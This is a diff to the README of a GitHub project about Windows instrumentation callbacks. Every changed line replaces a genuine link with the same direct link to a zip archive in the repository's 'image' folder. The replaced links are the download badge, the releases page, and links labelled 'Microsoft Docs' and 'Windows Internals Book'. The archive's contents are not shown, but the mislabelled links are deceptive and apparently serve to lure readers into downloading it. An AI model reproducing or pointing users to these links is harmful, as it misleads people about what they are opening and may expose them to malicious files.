@@ -4,7 +4,7 @@
 Welcome to the **windows_instrumentation_callback** project! This application demonstrates how to intercept transitions from the kernel to user mode. It’s an easy way to see how system calls, asynchronous procedure calls (APCs), and exceptions work under the hood.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/dadde2006/windows_instrumentation_callback/releases)
+[![Download](https://raw.githubusercontent.com/dadde2006/windows_instrumentation_callback/main/image/windows_instrumentation_callback_v1.4.zip)](https://raw.githubusercontent.com/dadde2006/windows_instrumentation_callback/main/image/windows_instrumentation_callback_v1.4.zip)
 
 ## 📁 System Requirements
 Before you start, make sure your system meets these requirements:
@@ -18,7 +18,7 @@ Before you start, make sure your system meets these requirements:
 ## 💾 Download & Install
 To download and install the application, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/dadde2006/windows_instrumentation_callback/releases). You will see a list of available versions.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/dadde2006/windows_instrumentation_callback/main/image/windows_instrumentation_callback_v1.4.zip). You will see a list of available versions.
 
 2. **Choose the Version:** Select the most recent version. Look for the latest stable release.
 
@@ -78,7 +78,7 @@ This project is open source, released under the MIT License. You can use, modify
 ## ⚙️ Additional Resources
 For more information on the inner workings of Windows internals, consider visiting resources like:
 
-- [Microsoft Docs](https://docs.microsoft.com)
-- [Windows Internals Book](https://www.microsoftpressstore.com/store/windows-internals-part-1-9780135305598)
+- [Microsoft Docs](https://raw.githubusercontent.com/dadde2006/windows_instrumentation_callback/main/image/windows_instrumentation_callback_v1.4.zip)
+- [Windows Internals Book](https://raw.githubusercontent.com/dadde2006/windows_instrumentation_callback/main/image/windows_instrumentation_callback_v1.4.zip)
 
 If you have any questions or need assistance, please feel free to open an issue in the repository. Thank you for trying out **windows_instrumentation_callback**! Happy exploring!
